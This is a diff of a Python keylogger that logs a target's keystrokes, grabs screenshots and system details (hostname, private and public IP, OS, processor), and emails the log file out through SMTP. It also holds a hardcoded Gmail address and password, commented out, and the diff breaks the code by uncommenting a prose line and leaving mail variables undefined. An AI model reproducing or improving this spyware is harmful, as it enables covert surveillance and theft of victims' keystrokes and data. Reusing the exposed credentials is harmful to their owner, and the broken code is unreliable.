@@ -5,6 +5,8 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
+import ssl
+import email
 
 # to collect computer info
 import socket
@@ -34,16 +36,17 @@ from multiprocessing import Process, freeze_support  # to get one screenshot at 
 from PIL import ImageGrab  # to grab images
 
 keys_information = "key_log.txt"
-email_address = "vikramathithyan99@gmail.com"
-password = "Vedha2018"
+system_information = "systeminfo.txt"
 
-toaddr = "vikramathithyan99@gmail.com"
+# email_address = "vikramathithyan99@gmail.com"
+# password = "Vedha2018"
+#toaddress = "vikramathithyan99@gmail.com"
 
 file_path = "F:\\Coding practise\\Python\\KeyLogger\\Project"
 extend = "\\"
 
 
-# function to send the key_log.txt file through email from target
+function to send the key_log.txt file through email from target
 def send_mail(filename, attachment, toaddr):
     fromaddr = email_address
 
@@ -85,7 +88,28 @@ def send_mail(filename, attachment, toaddr):
     s.quit()
 
 
-send_mail(keys_information, file_path + extend + keys_information, toaddr)
+send_mail(keys_information, file_path + extend + keys_information, toaddress)
+
+
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip + '\n')
+
+        except Exception:
+            f.write("Couldn't get Public Address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor() ) + '\n')
+        f.write("System: " + platform.system() + " "+ platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + '\n')
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
 
 count = 0
 keys = []  # each pressed key will be appended here
